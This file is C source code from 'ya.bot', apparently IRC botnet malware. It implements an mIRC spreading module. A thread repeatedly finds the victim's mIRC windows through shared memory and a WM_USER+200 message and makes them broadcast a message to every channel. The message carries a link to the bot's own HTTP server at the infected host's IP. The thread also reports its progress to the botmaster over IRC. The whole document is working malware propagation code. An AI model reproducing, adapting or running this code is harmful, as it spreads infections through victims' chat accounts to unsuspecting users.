/*  ya.bot  */

#include "..\bot\bot.h"

#ifndef NO_MIRCSCAN
DWORD WINAPI mircscan_main(LPVOID param)
{
	DWORD dwTime;
	SMircScan s_ms = *((SMircScan *)param);

#ifndef NO_DEBUG
		debug_print("Starting mIRC scan thread, mircscan_main()");
#endif

	if ((!s_ms.m_bSilent) && (s_ms.m_bVerbose))
			irc_message(s_ms.m_bsock, s_ms.m_szAction, s_ms.m_szDestination,
					(char *)string_mircscanstarted,
					CBLUE, string_replymircscan, CEND, string_replydotbot,
					CBLUE, CEND, s_ms.m_szMessage,
					CBLUE, CEND, s_ms.m_nDelay,
					CBLUE, CEND, s_ms.m_dwTime);
		dwTime = GetTickCount();
	while (TRUE)
	{

#ifndef NO_DAEMONHTTP
			mircscan_sendcommand((char *)string_mircscanamsg,
					s_ms.m_szMessage,
					ip_getip(s_ms.m_bsock), daemonhttpport,
					daemonhttpfilename);
#endif

		if ((GetTickCount() - dwTime) >= (s_ms.m_dwTime * 60000))
				break;
			Sleep(s_ms.m_nDelay * 1000);
	}
	if ((!s_ms.m_bSilent) && (s_ms.m_bVerbose))
			irc_message(s_ms.m_bsock, s_ms.m_szAction, s_ms.m_szDestination,
					(char *)string_mircscanfinished,
					CBLUE, string_replymircscan, CEND, string_replydotbot,
					CBLUE, CEND, (GetTickCount() - dwTime) / 60000,
					CBLUE, CEND, s_ms.m_szMessage,
					CBLUE, CEND, s_ms.m_nDelay);
		thread_remove(THREAD_MIRCSCAN);
		return 0;
}

bool mircscan_sendcommand(char *pszCommand, ...)
{
	char szBuffer[IRCBUF];
	va_list va;

#ifndef NO_DEBUG
		debug_print("Sending command to mIRC, mircscan_sendcommand()");
#endif

	if (!pszCommand)
			return FALSE;
		va_start(va, pszCommand);
		_vsnprintf(szBuffer, sizeof(szBuffer) - 1, pszCommand, va);
		va_end(va);
		EnumWindows((WNDENUMPROC)mircscan_window, (LPARAM)szBuffer);
		return TRUE;
}

bool CALLBACK mircscan_window(HWND hWnd, LPARAM param)
{
	char *pszData, szClassName[MEDBUF];
	HANDLE hFile;

#ifndef NO_DEBUG
		debug_print("Enumerating mIRC window, mircscan_window()");
#endif

		GetClassName(hWnd, szClassName, sizeof(szClassName) - 1);
	if (strcmp(szClassName, string_mircscanmirc) == 0)
	{
			hFile = CreateFileMapping(INVALID_HANDLE_VALUE,
					NULL,
					PAGE_READWRITE,
					0,
					4096,
					string_mircscanmirc);
			pszData = (char *)MapViewOfFile(hFile, FILE_MAP_ALL_ACCESS, 0, 0, 0);
			wsprintf(pszData, (const char *)param);
			SendMessage(hWnd, WM_USER + 200, 1, 0);
			UnmapViewOfFile(pszData);
			CloseHandle(hFile);
	}
		return TRUE;
}
#endif